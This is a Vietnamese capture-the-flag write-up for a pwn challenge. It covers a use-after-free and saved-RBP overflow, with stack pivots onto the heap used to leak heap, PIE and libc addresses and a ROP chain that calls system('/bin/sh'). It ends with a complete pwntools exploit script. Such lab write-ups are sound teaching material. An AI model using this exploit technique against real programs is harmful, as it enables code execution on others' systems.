# PTIT HCM CTF 2026 - Pwn - SpeedRun
*Tran Tien Dat - datious*

**I. Tổng quan về challenge**
1. Các lớp bảo vệ
 - Speedrunn.zi
 ![image](https://hackmd.io/_uploads/HyMKQ5i2fx.png)

- Đây là các file mà challenge đã cung cấp. Trước tiên tiến hành kiểm tra các lớp bảo mật có trong file bin:
![image](https://hackmd.io/_uploads/SyslE5s2zl.png)
=> Hầu như mọi cơ chế bảo mật đều được bật và sau khi xem qua DockerFile ta thấy là server đang sử dụng hệ điều hành Ubuntu 22.04 và glibc phiên bản 2.35 (chứa cơ chế bảo vệ safe-linking).

2. Tiến hành phân tích các chức năng của chương trình.
- Option 1 - alloc:
    + Nhập index (0 <= index <= 1000).
    + Malloc vùng nhớ với kích thước 0x48 và lưu con trỏ vào *array[index]*.
    + Đọc tối đa 0x48 bytes vào chunk với read(0, chunk, 0x48).
- Option 2 - print: 
    + Nhập index và chương trình sẽ in ra giá trị của vùng nhớ mà con trỏ chứa trong *array[index]* trỏ tới.
- Option 3 - free:
    + Nhập index và *free(array[index])*. Tại đây xảy ra lồi UAF - sau khi free thì nội dung mà con trỏ trỏ tới sẽ được giải phóng nhưng chính con trỏ nằm tại *array[index]* lại chưa được xét Null.
- Option 4 - restart:
    + Gọi một hàm phụ tại 0x12f3: 
    ```
      undefined1 local_108 [256];

      read(0,local_108,0x108);
    ```
    
    ```
    mov  rsp, rbp
    pop  rbp
    leave                  ; <--- LEAVE LẦN 2!
    and  rsp, 0xfffffffffffffff0
    call main              ; <--- GỌI LẠI HÀM MAIN! (AI ho tro)
    ```
    + Đây là lổ hổng thứ 2 BufferOverflow - Ghi đè thanh ghi saved RBP:
    + Buffer có kích thước 0x100 bytes nhưng read() lại cho nhập vào 0x108 => ghi đè saved RBP.
    + Nhờ 2 lệnh pop rbp;leave nên thanh ghi *rsp* bị ép nhảy đến *target_rbp* mà chúng ta có thể ghi đè.
    + Ngay tiếp đó lệnh *call main* được gọi lại với stack mới.
    
**II. Sơ lược cách thức khai thác**
1. Cách truy cập index sau khi dời array lên heapheap
- Trong hàm main con trỏ array nằm trên stack và được tính toán thông qua RBP:
    ```
    lea  rax, [rbp - 0x1f70]
    add  rax, 0x10             ; rax = rbp - 0x1f60 (Địa chỉ bắt đầu mảng array)
    lea  rdx, [rax * 8]        ; rdx = index * 8
    add  rax, rdx              ; Địa chỉ array[index] = (rbp - 0x1f60) + index * 8
    ```
- Công thức tính toán dựa trên độ lớn vùng nhớ của từng *array[index]*: *array[index]=RBP−0x1f60+(index×8)*
- Khi truy cập tại index = 1000 thế vô công thức ta được: *array[1000]=RBP−0x1f60+0x1f40=RBP−0x20*
=> *array[1000]* luôn nằm cách rbp một đoạn 0x20 tức là *rbp-0x20*.

2. Stack pivot trên Heap.
- Máy tính không thể phân biệt vùng nào là heap vùng nào là stack nó chỉ tính toán dựa trên thanh ghi rbp.

**III. Tiến hành khai thác**
* Kịch bản: Lỗi UAF (leak heap base) -> Pivot stack lần 1 (leak PIE base) -> Pivot lần 2 (leak libc base) -> Pivot lần 3 (ROP chain để chiếm shell).
1. Leak heap base:
- Cấp phát chunk 0: alloc(0,b'A'*8).
- Giải phóng chunk 0: free(0) -> chunk 0 được đưa vào tcache bin (glibc 2.35).
- Cách mà safe-linking hoạt động: fd = (addr>>12)^next_ptr vì chunk 0 đang nằm trong tcache bin một mình nên fd = (addr>>12)^0 (safe key). key
- Nhờ Use-After-Free gọi print sau khi chunk 0 được free: in ra được giá trị fd của chunk 0.
    ```
    leak = print_chunk(p, 0)
    safe_key = u64(leak.ljust(8, b'\x00'))
    heap_base = safe_key << 12
    log.success(f"Heap base: {hex(heap_base)}")
    ``` 
    
2. Pivot lần 1 (leak PIE base)
- Khi hàm restart thực hiện call mainmain, CPU tự động push trở lại (PIE + 0x1326) vào đỉnh stack hiện tại P1.
- Dàn xếp heap (tạo vòng lặp tạo 260 chunks):
    ```
    TARGET_IDX = 250
    chunk_target_addr = heap_base + 0x2a0 + TARGET_IDX * 0x50
    P1 = chunk_target_addr + 0x28

    for i in range(1, 261):
        if i in (TARGET_IDX - 1, TARGET_IDX, TARGET_IDX + 1):
            alloc(p, i, p64(P1) * 9)   # Trải thảm con trỏ P1 vào các chunk 249, 250, 251
        else:
            alloc(p, i, b'X' * 8) AI hỗ trợ
    ```trợ
- Tạo chuỗi 260 chunks để tránh làm hỏng dữ liệu metadata trên heap khi dời stack frame của main lên heap.
-  Điền toàn bộ dữ liệu của chunk 249, 250, 251 bằng con trỏ P1. Khi chọn RBP = P1. Ô nhớ array[1000] rơi chính xác vào P1-0x20 => giá trị tại array[1000] = P1.
-  Leak: Gọi restart(p,P1). Khi vào main gọi print để in dữ liệu trong array[1000]
    ```
    leaked_pie = print_chunk(p, 1000)
    pie_base = u64(leaked_pie.ljust(8, b'\x00')) - 0x1326
    elf.address = pie_base
    log.success(f"PIE base: {hex(pie_base)}")
    ```
3. Leak libc base
- Khi đã có PIE base ta biết chính xác địa chỉ put@got.
- Cấp phát 100 chunks (từ 0 đến 99) điền toàn bộ bằng put@gotgot:
    ```
    for i in range(0, 100):
        alloc(p, i, p64(puts_got) * 9)
    ```
- Leak libc base: P2 = heap_base + 0x6008 sao cho ô nhớ P2-0x20 nằm trúng vào các chunk vừa điền put@got gọi restart(p,P2) -> print(p,P2).
    ```
    leaked_libc = print_chunk(p, 1000)
    puts_libc = u64(leaked_libc.ljust(8, b'\x00'))
    libc.address = puts_libc - libc.sym['puts']
    log.success(f"Libc base: {hex(libc.address)}")
    ```
4. ROP chain và chiểm shell
- Khi thoát khỏi vòng lặp main, chương trình thực hiện:
    ```
    leave     ; rsp = rbp; pop rbp  --> rsp nhảy tới RBP + 8
    ret       ; pop rip             --> nhảy tới địa chỉ lưu tại RBP + 8
    ```
- Đặt RBP = CC (C bất kì nằm trong tcache)
- Return address sẽ nằm tại C+8.
- Sắp xếp chain: 
    ```
    alloc(p, 0, b'C' * 8)
    free_chunk(p, 0) # Đưa chunk C vào tcache
    ```
- Vd chunk C = heap_base + 0x7320
- Gọi restart(p,P3) = C+8
- main khởi động RBP = C.
- Return address  = C+8.
- Gọi alloc(p,rop_chain) -> malloc(0x48) lấy chính chunk C từ tcache, tại read(0,C,0x48) ghi đè nội dung ROP chain vào chunk CC:
```
C+0x00: fake RBP = p64(0)
C+0x08: ret (chia hết cho 16 để alignment cho system)
C+0x10: pop_rdi;ret
C+0x18: con trỏ chuỗi "/bin/sh\0"
C+0x20: system()
```
=> Kích hoạt shell bằng cách thoát chương trình (nhập kí tự bất kì ngoài 1,2,3,4) => main: leave;retret:
    + leave kéo rsp về C+8
    + ret nhảy vào ROP chainchain: thực thi system("/bin/sh").
    
**IV. Script (hỗ trợ bởi AI)**AI
```
#!/usr/bin/env python3
from pwn import *

BINARY = './chall_patched' if os.path.exists('./chall_patched') else './chall'
context.binary = elf = ELF(BINARY, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process([elf.path])

def alloc(p, idx, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index : ', str(idx).encode())
    p.sendlineafter(b'data : ', data)

def print_chunk(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index : ', str(idx).encode())
    p.recvuntil(b'data : ')
    return p.recvuntil(b'\n\n')[:-2]

def free_chunk(p, idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index : ', str(idx).encode())

def restart(p, target_rbp):
    p.sendlineafter(b'> ', b'4')
    payload = b'A' * 0x100 + p64(target_rbp)
    p.send(payload)
    p.recvuntil(b'=== menu ===')

def main():
    p = start()

    # STEP 1: LEAK HEAP BASE
    log.info("=== STEP 1: LEAK HEAP BASE ===")
    alloc(p, 0, b'A' * 8)
    free_chunk(p, 0)
    leak = print_chunk(p, 0)
    safe_key = u64(leak.ljust(8, b'\x00'))
    heap_base = safe_key << 12
    log.success(f"Heap base: {hex(heap_base)}")

    # STEP 2: LEAK PIE BASE
    log.info("=== STEP 2: LEAK PIE BASE VIA STACK PIVOT 1 ===")
    TARGET_IDX = 250
    chunk_target_addr = heap_base + 0x2a0 + TARGET_IDX * 0x50
    P1 = chunk_target_addr + 0x28

    for i in range(1, 261):
        if i in (TARGET_IDX - 1, TARGET_IDX, TARGET_IDX + 1):
            alloc(p, i, p64(P1) * 9)
        else:
            alloc(p, i, b'X' * 8)

    restart(p, P1)
    leaked_pie = print_chunk(p, 1000)
    pie_base = u64(leaked_pie.ljust(8, b'\x00')) - 0x1326
    elf.address = pie_base
    log.success(f"PIE base: {hex(pie_base)}")

    # STEP 3: LEAK LIBC BASE
    log.info("=== STEP 3: LEAK LIBC BASE VIA STACK PIVOT 2 ===")
    puts_got = elf.got['puts']
    for i in range(0, 100):
        alloc(p, i, p64(puts_got) * 9)

    P2 = heap_base + 0x6008
    restart(p, P2)

    leaked_libc = print_chunk(p, 1000)
    puts_libc = u64(leaked_libc.ljust(8, b'\x00'))
    libc.address = puts_libc - libc.sym['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    # STEP 4: ROP CHAIN & SHELL
    log.info("=== STEP 4: CODE EXECUTION / SHELL VIA STACK PIVOT 3 ===")
    alloc(p, 0, b'C' * 8)
    free_chunk(p, 0)

    C = heap_base + 0x7320
    P3 = C + 8
    restart(p, P3)

    rop = ROP(libc)
    ret = rop.find_gadget(['ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    rop_payload = flat({
        0x00: p64(0),
        0x08: p64(ret),
        0x10: p64(pop_rdi),
        0x18: p64(binsh),
        0x20: p64(system)
    })

    alloc(p, 0, rop_payload)
    p.sendlineafter(b'> ', b'q') # Thoát main để kích hoạt leave; ret
    log.success("Spawning Shell!")
    p.interactive()

if __name__ == '__main__':
    main()
```

![image](https://hackmd.io/_uploads/HkgKQqos3Gl.png)
